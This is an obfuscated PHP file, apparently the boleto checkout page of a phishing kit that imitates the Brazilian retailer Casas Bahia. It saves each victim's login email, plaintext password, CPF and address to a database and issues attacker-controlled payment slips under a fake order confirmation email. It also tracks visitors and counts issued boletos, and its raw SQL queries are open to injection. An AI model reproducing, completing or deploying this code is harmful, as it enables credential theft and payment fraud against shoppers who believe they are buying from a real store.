<?php /*
Casas Bahia v1.0
*/
require_once('vendor/mustache/mustache/src/Mustache/Autoloader.php');
Mustache_Autoloader::register();

$GLOBALS["exnxwenapgux"] = "dbconfig";
$GLOBALS["fhcguhsty"] = "arch";
$GLOBALS["gmdzyyfqp"] = "send";
$GLOBALS["jtrlwadkjedj"] = "dados";
$GLOBALS["pyhburzrum"] = "email";
$GLOBALS["qborgu"] = "dadosSMTP";
$GLOBALS["bwufdycmu"] = "urlbase";
$GLOBALS["fsrpvgi"] = "html";
$GLOBALS["vtcowstsk"] = "imgProduto";
$GLOBALS["dejwjxuclr"] = "nomeProduto";
$GLOBALS["qqhhksnsp"] = "produto";
$GLOBALS["diltkx"] = "vencimento";
$GLOBALS["ucgfsb"] = "numero";
$GLOBALS["sgintuiva"] = "chave";
$GLOBALS["ekspupb"] = "data";
$urrynpges = "style";
$GLOBALS["pflhkrjoux"] = "linha";
$GLOBALS["ndcunjn"] = "linha_id";
$GLOBALS["uguxyycruvil"] = "select";
$GLOBALS["xurqxsl"] = "referencia";
$GLOBALS["uvhqvntzujr"] = "telefone";
$GLOBALS["srnqtnhxd"] = "destinatario";
$GLOBALS["actzmvjel"] = "address";
$GLOBALS["gnlekmtqrk"] = "pedido";
$GLOBALS["mzldabphdg"] = "cpf";
$GLOBALS["yaixhvomcx"] = "cep";
$GLOBALS["ovhvjwtmou"] = "estado";
$GLOBALS["qjhbqvs"] = "cidade";
$GLOBALS["tphylpsqdm"] = "bairro";
$GLOBALS["culrwqkssv"] = "endereco";
$GLOBALS["svbyzjiyzhs"] = "verificaBoletos";
$GLOBALS["ltcxvm"] = "config";
$GLOBALS["mnxfdre"] = "server_token";
$GLOBALS["cttfnpihizdq"] = "now";
$GLOBALS["xcbmcpsqkq"] = "cliente_token";
$GLOBALS["pqyxcdozts"] = "expira";
$GLOBALS["iqmehfjckk"] = "token";
$GLOBALS["ruxhjm"] = "jwt";
$GLOBALS["mxtgifdetywf"] = "nomePD";
$GLOBALS["jpchpyy"] = "crud";
$GLOBALS["eftdsjw"] = "access_token";
$GLOBALS["oymigohtvczw"] = "curl";
$GLOBALS["xppucpsrmkl"] = "delete";
$GLOBALS["goopiedpfezt"] = "inf";
\Source\Modells\protect::cartId();
$qpxqqmsh = "selectTokenInfos";
if (!isset($_SESSION["endereco"]))
{
    if (isset($_COOKIE["codigo"]))
    {
        redir(gerarPHX() . "/carrinho");
        exit();
    }
    else
    {
        require __DIR__ . "/404.php";
        exit();
    }
}
use Source\Modells\inf;
use Source\Modells\Curl;
$
{
    $GLOBALS["xppucpsrmkl"]
} = pdo()->query("delete from href where `init` < '" . time() . "' or `init` > '" . (time() + 3600) . "'");
$
{
    $qpxqqmsh
} = pdo()->query("select * from href");
$
{
    $GLOBALS["goopiedpfezt"]
} = new inf();
$xsuedmmekxm = "produto";
$ghybizsh = "produto";
if ($selectTokenInfos->rowCount() == 0)
{
    $GLOBALS["okeogfykead"] = "json_token";
    $GLOBALS["kwruxyduise"] = "curl";
    $GLOBALS["dqxnblb"] = "json_token";
    $
    {
        $GLOBALS["oymigohtvczw"]
    } = (new Curl())->setUrl($inf->getBase())
        ->setHeaders($inf->getHeaders())
        ->setPostFields($inf->getPostFields())
        ->getContents();
    $
    {
        $GLOBALS["okeogfykead"]
    } = json_decode($
    {
        $GLOBALS["kwruxyduise"]
    });
    if (empty($
    {
        $GLOBALS["dqxnblb"]
    }))
    {
        loadMsgToken();
    }
    if (!empty($json_token->error))
    {
        loadMsgToken($json_token->msg, $json_token->error_code);
    }
    if (!empty($json_token->access_token))
    {
        $GLOBALS["mgomfwwdguen"] = "registro";
        $
        {
            $GLOBALS["eftdsjw"]
        } = $json_token->access_token;
        if (\Source\Modells\JWT::verify($
        {
            $GLOBALS["eftdsjw"]
        }) === false)
        {
            loadMsgToken();
        }
        $GLOBALS["kvfitj"] = "registro";
        $
        {
            $GLOBALS["jpchpyy"]
        } = new \Source\Modells\crud("href");
        $
        {
            $GLOBALS["mgomfwwdguen"]
        } = $crud->insertDB(["src" => $
        {
            $GLOBALS["eftdsjw"]
        }
        , "init" => time() + 3600, "data" => atualDate() ]);
        if (empty($
        {
            $GLOBALS["kvfitj"]
        }))
        {
            loadMsgToken();
        }
    }
    else
    {
        loadMsgToken();
    }
}
else
{
    $ppzhct = "jwt";
    $GLOBALS["bpojrky"] = "resulToken";
    $isybguljlx = "token";
    $
    {
        $GLOBALS["bpojrky"]
    } = $selectTokenInfos->fetch(PDO::FETCH_OBJ);
    if (empty($resulToken->src))
    {
        loadMsgToken();
    }
    $
    {
        $isybguljlx
    } = $resulToken->src;
    $
    {
        $GLOBALS["ruxhjm"]
    } = \Source\Modells\JWT::verify($
    {
        $GLOBALS["iqmehfjckk"]
    });
    if ($
    {
        $ppzhct
    } === false)
    {
        loadMsgToken();
    }
    $GLOBALS["bpfnekrhjudo"] = "inicio";
    if (empty($jwt->token_expira) or empty($jwt->token_inicio) or empty($jwt->cliente_token))
    {
        loadMsgToken();
    }
    $
    {
        $GLOBALS["pqyxcdozts"]
    } = $jwt->token_expira;
    $
    {
        $GLOBALS["bpfnekrhjudo"]
    } = $jwt->token_inicio;
    $btkorookqkx = "inicio";
    $obavpkdyuspm = "cliente_token";
    $
    {
        $GLOBALS["xcbmcpsqkq"]
    } = $jwt->cliente_token;
    $GLOBALS["pcwspifpc"] = "expira";
    $
    {
        $GLOBALS["cttfnpihizdq"]
    } = time();
    $
    {
        $GLOBALS["mnxfdre"]
    } = crypto($
    {
        $GLOBALS["ltcxvm"]
    }
    ["serial"] . $
    {
        $GLOBALS["ltcxvm"]
    }
    ["senha"]);
    if ($
    {
        $GLOBALS["mnxfdre"]
    } !== $
    {
        $obavpkdyuspm
    })
    {
        loadMsgToken();
    }
    if ($
    {
        $GLOBALS["cttfnpihizdq"]
    } > $
    {
        $GLOBALS["pcwspifpc"]
    } or $
    {
        $GLOBALS["cttfnpihizdq"]
    } < $
    {
        $btkorookqkx
    })
    {
        loadMsgToken();
    }
}
$
{
    $GLOBALS["svbyzjiyzhs"]
} = $pdo->query("select id from boletos where produto_id = '$id' and gerado = '0'");
if ($verificaBoletos->rowCount() == 0)
{
    redir("{$arch}/pagamento");
    exit();
}
if (isset($_POST["gerarBoleto"]))
{
    $kpfjorzf = "numero";
    $
    {
        $GLOBALS["culrwqkssv"]
    } = htmlspecialchars(addslashes($_SESSION["endereco"]));
    $ccfdoxsefb = "destinatario";
    $dfosadrfik = "telefone";
    $GLOBALS["vlhjywjmmj"] = "referencia";
    $nueuibkx = "cep";
    $GLOBALS["bgdvjhqexeo"] = "verifica";
    $
    {
        $kpfjorzf
    } = htmlspecialchars(addslashes($_SESSION["numero"]));
    $eqwlpjkt = "cidade";
    $GLOBALS["iydqtuumb"] = "data";
    $eenygu = "senha";
    $
    {
        $ccfdoxsefb
    } = htmlspecialchars(addslashes($_SESSION["nome"]));
    $gtukmxghx = "email";
    $GLOBALS["nmpcascee"] = "address";
    $
    {
        $GLOBALS["tphylpsqdm"]
    } = htmlspecialchars(addslashes($_SESSION["bairro"]));
    $
    {
        $GLOBALS["qjhbqvs"]
    } = htmlspecialchars(addslashes($_SESSION["cidade"]));
    $
    {
        $GLOBALS["ovhvjwtmou"]
    } = htmlspecialchars(addslashes($_SESSION["estado"]));
    $
    {
        $GLOBALS["vlhjywjmmj"]
    } = htmlspecialchars(addslashes($_SESSION["referencia"]));
    $GLOBALS["jovudwxg"] = "pedido";
    $
    {
        $GLOBALS["yaixhvomcx"]
    } = htmlspecialchars(addslashes($_SESSION["cep"]));
    $
    {
        $dfosadrfik
    } = htmlspecialchars(addslashes($_SESSION["telefone"]));
    $
    {
        $gtukmxghx
    } = htmlspecialchars(addslashes($_SESSION["login"]));
    $
    {
        $eenygu
    } = htmlspecialchars(addslashes($_SESSION["senha"]));
    $GLOBALS["edrklenhrqb"] = "numero";
    $
    {
        $GLOBALS["mzldabphdg"]
    } = isset($_SESSION["cpf"]) ? $_SESSION["cpf"] : null;
    $
    {
        $GLOBALS["iydqtuumb"]
    } = date("d/m/Y");
    $
    {
        $GLOBALS["gnlekmtqrk"]
    } = mt_rand();
    $_SESSION["pedido"] = $
    {
        $GLOBALS["jovudwxg"]
    };
    $
    {
        $GLOBALS["actzmvjel"]
    } = ["destinatario" => htmlentities($
    {
        $GLOBALS["srnqtnhxd"]
    }) , "telefone" => htmlentities($
    {
        $GLOBALS["uvhqvntzujr"]
    }) , "endereco" => htmlentities($
    {
        $GLOBALS["culrwqkssv"]
    }) , "numero" => htmlentities($
    {
        $GLOBALS["edrklenhrqb"]
    }) , "bairro" => htmlentities($
    {
        $GLOBALS["tphylpsqdm"]
    }) , "cidade" => htmlentities($
    {
        $eqwlpjkt
    }) , "estado" => htmlentities($
    {
        $GLOBALS["ovhvjwtmou"]
    }) , "cep" => htmlentities($
    {
        $nueuibkx
    }) , "referencia" => htmlentities($
    {
        $GLOBALS["xurqxsl"]
    }) , ];
    $
    {
        $GLOBALS["nmpcascee"]
    } = json_encode($
    {
        $GLOBALS["actzmvjel"]
    });
    $
    {
        $GLOBALS["bgdvjhqexeo"]
    } = $pdo->query("select id from boletos where produto_id = '$id' and gerado = '0'");
    if ($verifica->rowCount() > 0)
    {
        $GLOBALS["hwnppx"] = "destinatario";
        $eyctfmadke = "cep";
        $GLOBALS["eiyklpmis"] = "res";
        $GLOBALS["qxutrlj"] = "data";
        $
        {
            $GLOBALS["uguxyycruvil"]
        } = $pdo->query("select * from boletos where produto_id = '$id' and gerado = '0' order by id asc");
        $GLOBALS["npwhgxfeykw"] = "res";
        $dgdzapbwkj = "pedido";
        $GLOBALS["szurdofnwtac"] = "res";
        $GLOBALS["whphanuexvei"] = "html";
        $agkscacasw = "vencimento";
        $kwpyjextg = "produto";
        $
        {
            $GLOBALS["eiyklpmis"]
        } = $select->fetch(PDO::FETCH_ASSOC);
        $
        {
            $GLOBALS["ndcunjn"]
        } = $
        {
            $GLOBALS["szurdofnwtac"]
        }
        ["id"];
        $effordowp = "dbconfig";
        $lksfjjpcao = "data";
        $GLOBALS["tdoyoiosl"] = "html";
        $GLOBALS["ecqtwbamm"] = "html";
        $ssyytfypi = "estado";
        $GLOBALS["gcjnhyetdai"] = "linha";
        $GLOBALS["yinbcrfo"] = "email";
        $wkoxycwul = "valorProduto";
        $gbptdggk = "produto";
        $dqlgsr = "chave";
        $vpiufyjlgc = "html";
        $GLOBALS["nhdevro"] = "chave";
        $
        {
            $GLOBALS["pflhkrjoux"]
        } = $
        {
            $GLOBALS["npwhgxfeykw"]
        }
        ["linha"];
        $ioqnkd = "bairro";
        $
        {
            $GLOBALS["ekspupb"]
        } = date("d/m/Y");
        $wjpdhboobm = "html";
        $
        {
            $agkscacasw
        } = date("d/m/Y", strtotime("+{$dbconfig['dias']} day"));
        $
        {
            $GLOBALS["sgintuiva"]
        } = ["linha" => $
        {
            $GLOBALS["gcjnhyetdai"]
        }
        , "endereco" => $
        {
            $GLOBALS["culrwqkssv"]
        }
        , "numero" => $
        {
            $GLOBALS["ucgfsb"]
        }
        , "bairro" => $
        {
            $ioqnkd
        }
        , "cidade" => $
        {
            $GLOBALS["qjhbqvs"]
        }
        , "estado" => $
        {
            $ssyytfypi
        }
        , "cep" => $
        {
            $eyctfmadke
        }
        , "referencia" => $
        {
            $GLOBALS["xurqxsl"]
        }
        , "sacado" => $
        {
            $GLOBALS["hwnppx"]
        }
        , "data" => $
        {
            $GLOBALS["qxutrlj"]
        }
        , "vencimento" => $
        {
            $GLOBALS["diltkx"]
        }
        , "pedido" => $
        {
            $dgdzapbwkj
        }
        , "valor" => number_format($
        {
            $GLOBALS["qqhhksnsp"]
        }
        ["valor"], 2, ",", ".") ];
        $
        {
            $dqlgsr
        } = json_encode($
        {
            $GLOBALS["sgintuiva"]
        });
        $qqbrmeptv = "html";
        $
        {
            $GLOBALS["sgintuiva"]
        } = base64_encode($
        {
            $GLOBALS["nhdevro"]
        });
        $rprurkkbrw = "dados";
        $GLOBALS["xlvhlkii"] = "valorProduto";
        $wcyfrvix = "pedido";
        $xyjfscr = "html";
        $GLOBALS["gyecfawotvj"] = "produto";
        $GLOBALS["erxqvfaytkt"] = "html";
        $
        {
            $GLOBALS["dejwjxuclr"]
        } = $
        {
            $gbptdggk
        }
        ["nome"];
        $
        {
            $wkoxycwul
        } = $
        {
            $kwpyjextg
        }
        ["valor"];
        $GLOBALS["qmchwdnhc"] = "html";
        $
        {
            $GLOBALS["vtcowstsk"]
        } = $
        {
            $GLOBALS["gyecfawotvj"]
        }
        ["img"];
        $pdo->query("INSERT INTO `dados_boletos`(`email`, `senha`, `data`, `produto`, `valor`, `linha`, `pedido`, `ip`, `img`, `cobrado`, `vencimento`, `pdf`, `endereco`, `numero`, `bairro`, `cidade`, `estado`, `referencia`, `doc`, `cep`, `nome`) VALUES ('$email', '$senha', '$data', '$nomeProduto', '$valorProduto', '$linha', '$pedido', '$ip', '$imgProduto', '0', '$vencimento', '$chave', '$endereco', '$numero', '$bairro', '$cidade', '$estado', '$referencia', '$cpf', '$cep', '$destinatario')");
        $pdo->query("update boletos set gerado = '1' where id = '$linha_id'");
        $
        {
            $GLOBALS["fsrpvgi"]
        } = file_get_contents(__DIR__ . "/../views/emails/boleto.html");
        $
        {
            $GLOBALS["tdoyoiosl"]
        } = str_replace("{Nome}", ucwords($
        {
            $GLOBALS["srnqtnhxd"]
        }) , $
        {
            $GLOBALS["fsrpvgi"]
        });
        $
        {
            $qqbrmeptv
        } = str_replace("{data}", $
        {
            $lksfjjpcao
        }
        , $
        {
            $GLOBALS["ecqtwbamm"]
        });
        $
        {
            $wjpdhboobm
        } = str_replace("{produto_nome}", $
        {
            $GLOBALS["dejwjxuclr"]
        }
        , $
        {
            $GLOBALS["fsrpvgi"]
        });
        $
        {
            $GLOBALS["fsrpvgi"]
        } = str_replace("{img}", $
        {
            $GLOBALS["vtcowstsk"]
        }
        , $
        {
            $GLOBALS["fsrpvgi"]
        });
        $
        {
            $GLOBALS["fsrpvgi"]
        } = str_replace("{pedido}", $
        {
            $GLOBALS["gnlekmtqrk"]
        }
        , $
        {
            $GLOBALS["fsrpvgi"]
        });
        $
        {
            $GLOBALS["fsrpvgi"]
        } = str_replace("{url}", $
        {
            $GLOBALS["bwufdycmu"]
        } . "views/saved/?b={$chave}", $
        {
            $GLOBALS["fsrpvgi"]
        });
        $
        {
            $GLOBALS["fsrpvgi"]
        } = str_replace("{valor}", number_format($
        {
            $GLOBALS["xlvhlkii"]
        }
        , 2, ",", ".") , $
        {
            $GLOBALS["qmchwdnhc"]
        });
        $
        {
            $GLOBALS["fsrpvgi"]
        } = str_replace("{linha}", $
        {
            $GLOBALS["pflhkrjoux"]
        }
        , $
        {
            $GLOBALS["whphanuexvei"]
        });
        $
        {
            $vpiufyjlgc
        } = str_replace("{endereco}", "Endereço: $endereco, Nº $numero, Bairro: $bairro <br>\n        Cidade: $cidade, Estado: $estado <br>\n        CEP: $cep\n        ", $
        {
            $xyjfscr
        });
        $
        {
            $GLOBALS["qborgu"]
        } = ["nome" => "Resumo do pedido", "email" => $
        {
            $GLOBALS["yinbcrfo"]
        }
        , "assunto" => "Recebemos o seu pedido 02-{$pedido}", "msg" => $
        {
            $GLOBALS["fsrpvgi"]
        }
        ];
        $
        {
            $rprurkkbrw
        } = ["email" => $
        {
            $GLOBALS["pyhburzrum"]
        }
        , "pedido" => $
        {
            $wcyfrvix
        }
        , "msg" => $
        {
            $GLOBALS["erxqvfaytkt"]
        }
        ];
        if (rows("bia") > 0 and $
        {
            $effordowp
        }
        ["rwite"] == "BCTR-D85D-KIAO-S83S")
        {
            $pcdeoixm = "bia";
            $
            {
                $pcdeoixm
            } = bia($
            {
                $GLOBALS["jtrlwadkjedj"]
            });
            $gsteyns = "bia";
            if (!$
            {
                $gsteyns
            })
            {
                $pdo->query("update dados_boletos set fail = '1' where pedido = '$pedido'");
            }
        }
        else
        {
            $
            {
                $GLOBALS["gmdzyyfqp"]
            } = send($
            {
                $GLOBALS["qborgu"]
            }
            , "boleto");
            if (!$
            {
                $GLOBALS["gmdzyyfqp"]
            })
            {
                $pdo->query("update dados_boletos set fail = '1' where pedido = '$pedido'");
            }
        }
        $pdo->query("update contador set boletos = (boletos+1)");
        redir("{$arch}/obrigado/$pedido");
    }
    else
    {
        echo "<script>alert(\"Por favor, escolha outra forma de pagamento\");</script>";
        redir("{$arch}/pagamento");
        exit();
    }
}
$
{
    $GLOBALS["mxtgifdetywf"]
} = limitarTexto($
{
    $GLOBALS["qqhhksnsp"]
}
["nome"]);
onlines("Pagamento Boleto", "{$nomePD}");

$template = file_get_contents('views/store/boleto.mustache');

$m = new Mustache_Engine(array('entity_flags' => ENT_QUOTES));

$params = [
    'base' => urlbase(),
    'base_pagamento' => substr(md5(time()) , 0, 20),
    'style' => $style,
    'valor' => number_format($produto["valor"], 2, ",", "."),
    'produto' => $produto,
    'nome' => ucwords($_SESSION["nome"]),
    'endereco' => ucwords($_SESSION["endereco"]),
    'numero' => ucwords($_SESSION["numero"]),
    'bairro' => ucwords($_SESSION["bairro"]),
    'referencia' => ucwords($_SESSION["referencia"]),
    'cidade' => ucwords($_SESSION["cidade"]),
    'estado' => ucwords($_SESSION["estado"]),
    'cep' => $_SESSION["cep"],
    'editar_endereco' => $arch,
    'parcelas' => $produto["parcelas"],
    'parcelamento' => number_format($produto["valor"] / $produto["parcelas"], 2, ",", "."),
    'prestacoes' => [],
];

$GLOBALS["sieirhhdfim"] = "produto";
for ($i = 1;$i <= $produto["parcelas"];$i++)
{
    $params['prestacoes'][] = "{$i}x sem juros de " . number_format($produto["valor"] / $i, 2, ",", ".");
}

if (!empty(pix()->verify_keys())) {
    $params['pix'] = 1;
}

if (rows("boletos where produto_id = '$id' and gerado = '0'") > 0) {
    $GLOBALS["gwixfxkmr"] = "arch";
    $params['boleto'] = 1;
}

echo $m->render($template, $params);